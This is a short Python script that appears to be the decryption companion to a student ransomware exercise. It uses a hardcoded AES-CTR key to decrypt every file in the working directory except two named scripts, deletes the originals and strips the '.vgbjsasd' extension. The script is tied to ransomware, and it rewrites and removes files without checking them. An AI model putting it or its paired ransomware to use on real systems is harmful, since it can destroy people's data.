import os
import pyaes


files = []


for file in os.listdir():
    if file == "ransomeware.py" or file == "descript.py":
        continue
    if os.path.isfile(file):
        files.append(file)
        
for file_name in files:
    ## abrir o arquivo criptografado
    file = open(file_name, "rb")
    file_data = file.read()
    file.close()
    ## chave para descriptografia
    key = b"arthurduarteboli"
    aes = pyaes.AESModeOfOperationCTR(key)
    decrypt_data = aes.decrypt(file_data)

    ## remover o arquivo criptografado
    os.remove(file_name)

    ## criar o arquivo descriptografado
    new_file = open(f'{file_name.replace(".vgbjsasd", "")}', "wb")
    new_file.write(decrypt_data)
    new_file.close()